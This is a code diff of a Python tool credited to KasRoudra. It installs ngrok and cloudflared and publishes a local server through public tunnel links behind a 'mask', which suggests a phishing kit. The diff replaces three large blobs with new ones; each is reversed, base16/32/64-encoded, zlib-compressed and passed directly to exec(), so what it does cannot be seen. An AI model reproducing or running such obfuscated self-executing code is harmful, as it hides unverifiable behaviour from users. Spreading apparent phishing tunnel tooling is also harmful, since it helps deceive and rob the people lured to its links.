@@ -89,7 +89,8 @@ Copyright (C) 2022 KasRoudra (https://github.com/KasRoudra)
 """
 
 
-_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b16decode(__[::-1]));exec((_)(b'0E272826F77D7D7CBD78242EA15B872300EED2B5083A5DD1F0C455025821798A3FB3F586448770FD717A9AED177F8EC727EF6F73C887919BF5AB24778546F834979BA548316DE48FAB20E138FAACBE5341ECC49D84B2B4996D903D87CE75DC181F57F0B7DD33137E3603E39BD0B055EC4FD1176883A4502B452A3A7321C45EE8539FCE5853D7C6DC5B228A312CF1827EC27B4FAA8C0D89C27107062EAE348B1CD4FCC129D99B165CE93860883104DED6827042D45C92CBE5DB3C6040EB36F418B45B5605E45BBDBC1F71063003ED0E1AB767671F3C3E1A94D2BCBCDED2B3422A35995E56E054C697820A30963104A1A217606D1A097A4C827C8A79D773A9DD8D76D6949F87C7FFE3FBFBF3F3F7F3F7F9F8236C71D888D98F4FB359A644B61818C28FF67C4639F834800481E6B41951C987'))
+_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b16decode(__[::-1]));exec((_)(b'DA96106DF1DFDF5FBF07ED8014540A1302E2914715D4B0B8CB7B5BB53DB0107919495868018825E75101F6557FBB64AB8E9D9DF5FC590BE338F83F361E87E2B7EDF091AE46E45A63B34E156F5D954B1D48BA206315A793E0E94891A60485B9EA5F7851AD83F6FDFBF8C558D19AF099929BE13F1F2939DCA49F67A8381A8E354819E48B0AF3DC0F95A9CA2B89374B6B0E1D2A3401C57790B90005F86A36F4041D2EA1AEABDCA631EC9980BD8CC1790768480FC18EDE029193522FF22B5003464D8A5C745AEE4A33DEDA0D95D213998B23457110DE5B08E1609E1FC3C1CF4009D367340B50108C96BC57B1B8456D6FCC2115841814E7F7F5FDFDFAFAFDFCFD7EBF606C602E97F949786B9884D80A8174EF8173BB72B28004D1D8BC1551C987'))
+
 
 # Color snippets
 black="\033[0;30m"
@@ -186,9 +187,25 @@ if system("command -v apk > /dev/null 2>&1")==0:
 else:
     apk=False
     
+# Check if mac has tunneler binaries
+if brew:
+    if system("command -v ngrok > /dev/null 2>&1")==0:
+        ngrok=True
+    else:
+        ngrok=False
+    if system("command -v cloudflared > /dev/null 2>&1")==0:
+        cloudflared=True
+    else:
+        cloudflared=False
+else:
+    ngrok=False
+    cloudflared=False
+
 print(f"\n{info}Please wait!\n")
 
-_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b32decode(__[::-1]));exec((_)(b'F3CYZ27A67P7VHK6EZ335X7HPQPM2GVHUNKRA7LTXW2RBRMX4CJG245MDZU33XD5KATB3MCHZOW7N45G627ZU2TAMOMUUQBA2SWSDPQLXFZ6CQAB76WC3AUF65QEMYNPTVQVRVDWMLWKJ5S4QQKLALVRZFXJ5NWS2Y534ZPZPYEGHXY6BACHCPC7MX7QM3W3PSIBPNOBNDBATPLNNKS5GGG4YYOCOYH7ZNMCNXYJE7ICVFB2ZCO35EZG4GBJ7JO64QH2QYP5VD3ORV3AR2DVBUXQV7ORCTQ7SXUROZ6F4CEADZP5JJ4V43XREGU7OT4R3FRXOYRILDR25CIQTZYZRZPWCN7UHNWMEAXJIW52EW4JH7V3M7TAUTWG3ILPUZMDDOQQKGRMA6UAMTDR3ENFCPZ6QWP6P4M4SHILCQVWARY2GZAGKFWPWMEKDX52ENZXR3RL6YCNYEAA54JQFCZIPA2MVPKPPMTV2FUBHBNQJG2TKHNB6QJPC2BSFHDBW652ULGRPIFNDHR7GUS7RAD4EUUP5UYDJXS2YA6ENNWTBM7TTD3JTTE72S4NJASEAC5RMIP4X3OV2NGZXBQ3ZXJHVYLEQCZMWLMFJWBAHAHFVPE6TD2WBQEFSTKZ7NBBMZOBNNV5BYYWUB73GSRVAW3OIYUJESP6YPOSROMCH5NWHHCES5JR2RD5RWDLCJVXALVITDU534GBSJJBUXQQTVP5Z2QYH3N4KK4L343WVH7JGMQ3BFIGNQS7T4ZCI6SDE4EL25VZTT2UF35PGESZWWRXGJPVK7YTHZHRDBCATMHJ723WKZEEPCETSZOIOHZRPPYVSPYWBWZGQPE3TL4UPBBRAISBAY27RAVAIGCBSI2UKBXTTQHGPCPWPKH3ZGD3BJMKHPGJVFHD4GNKFHQ2YAIFVHFUW33GWSSBDXU7RI2JRWX47CWZTCGJVOS2RYVBAMTT26DCRYDKXUQ7ZF5JTLE2AADNRHYXQ6JAP3TU375BNNXKLXBNW6HR42AJFRW2QS7AHUDX7EWOLID3AWGJZLIP563JCFYMFCLLJ6EHDKFVI2RXJDLWPCWLMYFLBCCAMBK3RBKXVLV6KYXQXIX5JNV7DYJL7KD6UKN7KK24VX75ZJIC46U7L65QSUQDCHMHOVBVF4X4JGT7DKVQ5OUQNLXC6FSIJXXWFJPL45CJEZURPZ5PILB4UN3MOD42MQYJYFEVZ4427NH2HSYBPDLRSKDJI536J3NX2KXLDJORV7LWPLBIJACTQ3WLSYO4OCHWY225KFTE4E6AZSDEB5TEWDUKSDKKIHQ5T2XOFHXG4EK6IAU3RGNPMAJYG4OBJJRFFH7SC4DHBJFFW6SSPC5LOV5M57AESVOVZ3RWUXPRNDZ3XDLL56QHS7NWJYPHLDZVBL5E445SYTZZEHBUH5IGJSUKMHKCLCH3ZA7YIBZ6Q2WVBRFDXJDPXYBHAKQN4MO6D2OS33F3LPI5OYGRBHGJ43IJAGOGT6NFE73BZCOSEQ7DSV2TA5X3ZSTOMY75LIF5A4QSXA4YGYSNO746SMNR6YQTZXOQN2YSFPOPC3JFDRXEIYAD3ACOLFSXZZEAJ7GQPTENCM55T2FTTTGSMEI6UJY6XQ7Y6TZK2BMPZACXEOYM5CJ2BHFAQHPRVDZDCOSYCTX4TOCYKGZSY3UWC2MFQVVXEIF3KUSVBDVBP5CZKOQUQK67IOGTOPTYIDFW4GGPZCAVSNWAZ74PTBM4ZCAK23ICRN4DQV3AI5XDAFFCPOHLN2UJTYEZWRNLWWSTKJCD6NT6A75A7Y4X3B4Y3HCUZH46XXZOAXSOPMBBXOAROU2SUKMJF73ASUUDJAX3RMUOHGYHLJ23DWLCUEJBLR24HAR5X75ZX66TP63777P63TX6UQCRCLMAHSO4765QSXLA4SMZNMPNMOVMZ62XKJ2J3DDSDMYBHKVKBOCP'))
+_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b32decode(__[::-1]));exec((_)(b'===OM4IDR77O5VH65XY74H42W4JIRMBKVVUOFA4YKAJ6M6RYMIQQGXV543K6J3MQPON4UO5O62LIZ6B5XB7AGLGVXIPXD2GCYLJB7SUKOO3X7PN35U7ARDLDVKNERLAMXDIIIXFEVSTGTDMT2TLSIHBD7KGOAG6LEZC33JMCMOXYU7Q327XMEWXYFBW4Q3NRXRAH2GMSWUR5HWW3N4IFHDOJF7DKJNDF6BSYSDYQM3BX2IZ6ZPHL4WBTCPQ6ESK7MXYRED7QHJX7OBOPRBVSEWNAMM3LS4AZYS7Y7NSSI4QQ43UH7Y3FVN5VQ5JDRYR2DPZEC72YR65LNLNB5LYQRAEB5BCHWROVMOQWYS66NA335BEZB4PSFDYFXLUKSBUY77LVLIQ4GSOMGNEIRZ6PEP4VZ5PTKIWQZMKJIYG3MUQVVJZQNSTX52LVRVORX2233YSGTXQTSM2PNRHZFY35TEOWCCPYWGYSPUT3MQ6CFHP7FCRMEEORL4S4IF3UGDVRXEQUJ4AY3GHD6AXPLBCDH5RKODLMJ7DP6HTMYRA3XGKMFTCLNNY7FBWGQPDMJRUDJ4DFCUEB34EFNCZ2ZTTFNFKQ3YE2FRTVTBVX5A6F5ULQLNLTLEDEKPIQZRYH57BJLPBSWKA3MQGSK3ECNRU45IZHKWCIRM723IQ632ZQQFUWKEREGUC3FAIK3ZIDAJJ7HZTDE6B56DYZJ7QXC6XJKAKRFZAND5KGCR7DV4W56P36RFF5GCVA6XZXZ22ZCGROM5CUNHOXEH7KYS5NPUVAHOGGKATGG3ZVPVE3JQEALB4FYSNFFXO4MAOPR7EZPODJVTOGBM42SVRI4JY55DBOPM6YROAIMOVYN5CGRY2KBQ5RSMS2DYMQMEFGQU72P6E6SNGSQI3SUQGFJDVD7FFB7K7OWB7WCTC3XNHC5DBLQDHWXMFZRLHWE6NFCSCZX244BFVLYMRP72R3IDQQL3JPZFMAK4QXXVVRHS52H37BYQUT7T3TQYEC63LTX2GU56F2UGPXX3EL3K6KJDMPQUARXBAJ22EOVG5K3IAPCHIQO5KVLYXFVLCTTB53T55XLEY6A7KNMP36VHCL3YN5DKF3HJNAXKSLSTJCWNL4H67SV4GQHAWLDA3I4FCGBO43SRPWOOUO6GAGUDUVLWV7RDWBM4RHKF3YXTZYV5WGIB3FQ2OGZJDI5WBW67GR7WC7GP5ILKXT5T5T3W2OCUF3HUKIIPM7QWKWEYFP6JTNBHYORXRHGUKRFS7OGICIGL2KQW6Q7WWS6LANNUQ5JRXDVISS33OFOWZHXJGWZO4PEG7TJ5LC2VVE4GDK4YKWILZIJIHCRA5DHVAS5LX6YAOBTNRO3AYMOQEFRH3WRARVPCEPEXJ5R5M2FT2B5FM5543H5AYTRIOJFVFTYEH3ZAKP3TFU6JX32IRUQALXFMSPWFDJ37FCGQA2BKBKY4U5SROTIPUQ2NQGE6DG2X5AOJWLXI37FQCR64UZEQDWUGBUM4FGKF4OGSALLXMPX5RHIFGV7B3DEJBRREORRE3LWRTAAIDK3CRSL3PHSQFWHX5NEH4BHOW2PGRQXZQMXQJ4KXKJKIXBFDNHNLCCK5XHABZIKVPJR6JA76KWCS4RXREINZ2WQMZSYDKFVAQ3ANCVR5YI5ZZVXXKZO7FA3F34TK3G4IL2Q3QAKLFFJA5TVNVEKECL63O3XXDB4VTIHWOM6BTM7Y2XV5X6PSJGWB6KQ6CWXQFVYW2S6D3SYCLXVC3QAEEOJYMTRZOWZL3XCCTF3DJBFVASLADFZCJAGLGVRN4SWJ3GMTI745V6NKJR6FJ3W74BEFPJ3Z5CHVGDINUQM3JYJIOUKPPJEEUIHIQ224ORCWG3D5AI6S43B644O4J6Z2G43S7UTFBTGJOQNCMDB5MGZDMG6AGLCIQUAVR4MA4526CKONWVCEESXOQVGJNJLYIN5QHAYQIDSIBROEN5JAAR5NIG3RRZVXK4GWH6T6BVFHZH7S6QQ25NYGF7MI3QHTX3M53FJ7L23ENDL5CXFZXO45T757763P6ZP643P77P7J7PO43MCEQACIABDO4R43BYQMMELCD3ENC3LBKZ25SXXR5RFCEMDM3BHKFLBOCP'))
+
+
 
 
 # Polite Exit
@@ -326,13 +343,15 @@ def updater():
             sleep(2)
 
 # First function main
-_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b64decode(__[::-1]));exec((_)(b'=k4SNjyD+//f/s+CnjSjM5zglTxdeRuCAfFMeG6V0kASFCa0dUtKG2yLfN/eEsMtr/J95uJZClgIRiM25LlMYWOmU4XEk97t+oZDonBcjr/o3UbhOiiHQ95erqp3kXeSxeR5yPQbHP+V354uzaanscVaqbOATFibLMrc1eHZLnQc6hPfdi7fgp8QEkaQhi5yaYslJnNFID36t27mNH3FDk/7MOQ2Q7dsS8sBFPfQM4Z9z1TqmCdnosuvti8Oc2xWl6u/bSpmMppY3t7YG9Np5eocP8bV5az42ba5Q4yQAZtZg5tfqb/Ot+9T+0jjTgkZOX/jTKImRUqr7hF78trCyd37TVoPyS9WEfGr5kh7+aKkW4QVVHneEBfptg2XCdvZT3nLluzYtye35No9nl6slOCDKMNwC89cncom4C1s9cz44i7jHg6NqQFf+NGbF4aFOifZ7yq27ktwn+bTj0MQlWSC3JVJzajXRN0E0IxfjJl4Q+oL0pa+im8lSfCtJsRoVmNTgg0+09LJcE9jakwVp6sRUrV/wzytd3jYm5BlOxwGXmbBL1hgXuo9859CvTnfAMbim4fHbS8JEfAfDBjBi5LSeDWlXTMNAarPEzojyVEiQ07CwBtP0k9mpjuWwoeEiXYPYZ1MEQwnviw+1cSnoV/BZQtDFf6bPIKZkmV5tV9+bqYWjOBJmNRD7qIg40asG0vKxY0p10ZAtBYFNc+VfDR8LuewBT7ijnx6Hbav82WD0MQ65A1TyoZfTJKTDRmY+0oSpzXSyplNMXCZNG1jCQuzhUOz0G3CHKyJ8iaUfXI56f6yMHhkf33Egxeq9wV2L6n1tiYkClPEeh265HiCeyLU7PmzRkGpow3zPjNbLzkWahq/Ccf1XjqCrQm2GCaI8wjlSfe3nEJKWFcUObd09p6HdRPdFcI1UNnUazsUs/SIilAMVbeSvZXHREhvrGaVdk3i6kSVnPyUXLJbztRfl5x2QMEbIHgAuMsW//ji/93fP/c5X3rbnaA/+2PfEMORDSErlILTjgnW1iFBBfHgFdTmPHNQAg0oyeL0NwJe'))
+_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b64decode(__[::-1]));exec((_)(b'b8XDvOw//+7fq6bdYW4XTCW033yVyWNjp/waqj8NhEflWSUq5CrxTOXtw7T+BTLUtP9g4SjoKeA0+TbWizZOdPjJsQDyyIhY+p0DoBX175JF0NfOWjPlL/1vP8gEJ94oqFq8StleHwwntxUAPsqgIGZZhOSNbnFrHexXt1jWpJtJo8oVcd4etbZCwtpW2Kx96Rp9CJS4fuBLFCWf+UOp6fubQTJUpB6E+8GIHY/VRl/5/cr5XCBtjpxDdgONizuOArlq+GytZawdj2n3czEkNqS3tXyrLBPeX6jK1OQ7tc13iCw/poIW/908pdR83kKGXBkbytU1FCVYrnlpiYKUOTFfihqV1PmsEhB/W4zUJkY6+tw3nnU0s5U3Shya62ZsRsm7WpPbby8NB1rEpdYM9alQYNtXV2j+S9G6Th5rK05klPx7i+Nf9lugFrTwxRn6w7V3V1WfiRyZTwPHDPkCmfLiQ9SbFXus8TkzoBOq/hk20TRh0I3kLXk8nmxuLlDOh8Sm1EXnfV2LyGr+iCCJKQTAY+lblfzKEwmqSCEBEGSFtyGMoqxuFgAjRMgx1Ot3GmbZeTi5NCl2YNhY8EychnC19JPmpr7uvwaUPjl7skCiiMdwbp8bDJiZ6BxYCwgxb52s2JuxzrEXVXPMxHAWXuQxR1b+EL2i2l1V+kN02ORg1SPU6DFhkbhfuHWj6IDmHqd2imUYfmdTI7EtbJ7+GSaEwxiRh9MOXVd+tdd70KWhmOs7AAM730GjcZjn/j47dvFSx1NeYCsLaq5915q1QOIpORMj9NA4UEJ3ZbUr9xmzl8W6RTf3UAx7tl7LqwDysN9geTmE4BC9oVsAnQxQ25zZ1QnmABCRcL3mjwu6EtUK4meLXl8zJxxbiYmVx62CKO/jPDlcoSriiIrchhe8FgvRyp0T8zKHK0d+LZOSwaQk3Ft0QFGFATcBrEClAzxTm1K4TM7L9g+LK/5nqAyH8gfEzyoALGalX4R0egJz1mG63hk0tXzYuFIHYyL5bik5zplLWSks6+Wr3k13o4doxNVD+innu12mZIgYxT4cJyxl9hAr7xdeP+QcL5YMEROPcSK+UmVWLF1WGqom/tkqHtqwVtHbyolgu9W5V00QQPHyNWgnRR0+qfyEA9PF+3///8j3sWRvCr97reA8HFI4BSfm3dgghdLADrK/lDNAAg1qWWU0NwJe'))
+
 
 # 2nd function installing packages and downloading tunnelers
 def prerequiments():
     internet()
     if termux:
         if system("command -v proot > /dev/null 2>&1")!=0:
+            sprint(f"\n{info}Installing proot{nc}")
             system("pkg install proot -y")
         installer("pkg")
     else:
@@ -368,70 +387,73 @@ def prerequiments():
         sprint(f"{error}Curl cannot be installed. Install it manually!{nc}")
         exit(1)
     killer()
-    x=popen("uname -m").read()
-    y=popen("uname").read()
-    if not isfile(f"{root}/.ngrokfolder/ngrok"):
+    architecture=popen("uname -m").read()
+    platform=popen("uname").read()
+    if not exists(f"{root}/.ngrokfolder"):
+        system("mkdir $HOME/.ngrokfolder")
+    if not exists(f"{root}/.cffolder"):
+        system("mkdir $HOME/.cffolder")
+    if not isfile(f"{root}/.ngrokfolder/ngrok") or (brew and not ngrok):
         sprint(f"\n{info}Downloading ngrok.....{nc}")
         internet()
         system("rm -rf ngrok.zip ngrok.tgz")
-        if y.find("Linux")!=-1:
-            if x.find("aarch64")!=-1:
+        if platform.find("Linux")!=-1:
+            if architecture.find("aarch64")!=-1:
                 system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz -O ngrok.tgz")
                 system("tar -zxf ngrok.tgz > /dev/null 2>&1 && rm -rf ngrok.tgz")
-            elif x.find("arm")!=-1:
+            elif architecture.find("arm")!=-1:
                 system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip -O ngrok.zip")
                 system("unzip ngrok.zip > /dev/null 2>&1 ")
-            elif x.find("x86_64")!=-1:
+            elif architecture.find("x86_64")!=-1:
                 system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip -O ngrok.zip")
                 system("unzip ngrok.zip > /dev/null 2>&1")
             else:
                 system("wget -q --show-progress https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip -O ngrok.zip")
                 system("unzip ngrok.zip > /dev/null 2>&1")
-        elif y.find("Darwin")!=-1:
-            if x.find("x86_64")!=-1:
+        elif platform.find("Darwin")!=-1:
+            if architecture.find("x86_64")!=-1:
                 system("wget -q --show-progress 'https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-darwin-amd64.zip' -O 'ngrok.zip'")
                 system("unzip ngrok.zip > /dev/null 2>&1")
-            elif x.find("arm64")!=-1:
+            elif architecture.find("arm64")!=-1:
                 system("wget -q --show-progress 'https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-arm64.zip' -O 'ngrok.zip'")
             else:
                 print(f"{error}Device architecture unknown. Download ngrok manually!")
+                system("brew install ngrok/ngrok/ngrok")
                 sleep(3)
         else:
             print(f"{error}Device not supported!")
             exit(1)
-        system("rm -rf ngrok.zip && mkdir $HOME/.ngrokfolder")
+        system("rm -rf ngrok.zip")
         system("mv -f ngrok $HOME/.ngrokfolder")
         if sudo:
             system("sudo chmod +x $HOME/.ngrokfolder/ngrok")
         else:
             system("chmod +x $HOME/.ngrokfolder/ngrok")
-    if not isfile(f"{root}/.cffolder/cloudflared"):
+    if not isfile(f"{root}/.cffolder/cloudflared") or (brew and not cloudflared):
         sprint(f"\n{info}Downloading cloudflared.....{nc}")
         internet()
         system("rm -rf cloudflared cloudflared.tgz")
-        if y.find("Linux")!=-1:
-            if x.find("aarch64")!=-1:
+        if platform.find("Linux")!=-1:
+            if architecture.find("aarch64")!=-1:
                 system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared")
-            elif x.find("arm")!=-1:
+            elif architecture.find("arm")!=-1:
                 system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared")
-            elif x.find("x86_64")!=-1:
+            elif architecture.find("x86_64")!=-1:
                 system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared")
             else:
                 system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared")
-        elif y.find("Darwin")!=-1:
-            if x.find("x86_64")!=-1:
+        elif platform.find("Darwin")!=-1:
+            if architecture.find("x86_64")!=-1:
                 system("wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz' -O 'cloudflared.tgz'")
-                system("tar -zxf cloudflared.tgz > /dev/null 2>&1 && rm -rf cloudflared.tgz")
-            elif x.find("arm64")!=-1:
-                print(f"{error}Cloudflared not available for device architecture!")
-                sleep(3)
+                system("tar -zxf cloudflared.tgz > /dev/null 2>&1")
             else:
                 print(f"{error}Device architecture unknown. Download cloudflared manually!")
+                system("brew install cloudflare/cloudflare/cloudflared")
                 sleep(3)
         else:
             print(f"{error}Device not supported!")
             exit(1)
-        system("mkdir $HOME/.cffolder")
+        system("rm -rf cloudflared.tgz")
         system("mv -f cloudflared $HOME/.cffolder")
         if sudo:
             system("sudo chmod +x $HOME/.cffolder/cloudflared")
@@ -497,6 +519,9 @@ def server(mask):
     if system("command -v termux-chroot > /dev/null 2>&1")==0:
         system(f"cd $HOME/.ngrokfolder && termux-chroot ./ngrok http {local_url} > /dev/null 2>&1 &")
         system(f"cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url {local_url} --logfile log.txt > /dev/null 2>&1 &")
+    elif brew and ngrok and cloudflared:
+        system(f"cd $HOME/.ngrokfolder && ngrok http {local_url} > /dev/null 2>&1 &")
+        system(f"cd $HOME/.cffolder && cloudflared tunnel -url {local_url} --logfile log.txt > /dev/null 2>&1 &")
     else:
         system(f"cd $HOME/.ngrokfolder && ./ngrok http {local_url} > /dev/null 2>&1 &")
         system(f"cd $HOME/.cffolder && ./cloudflared tunnel -url {local_url} --logfile log.txt > /dev/null 2>&1 &")
@@ -506,7 +531,11 @@ def server(mask):
         ngrok_check=True
     else:
         ngrok_check=False
-    cf_link=popen("cat $HOME/.cffolder/log.txt | grep -o 'https://[-0-9a-z]*\.trycloudflare.com'").read()
+    if isfile(f"{root}/.cffolder/log.txt"):
+        cf_link=popen("cat $HOME/.cffolder/log.txt | grep -o 'https://[-0-9a-z]*\.trycloudflare.com'").read()
+    else:
+        cf_link=""
+        sprint(f"\n{error}Cloudflared failed to start!{nc}")
     if cf_link.find("cloudflare")!=-1:
         cf_check=True
     else:
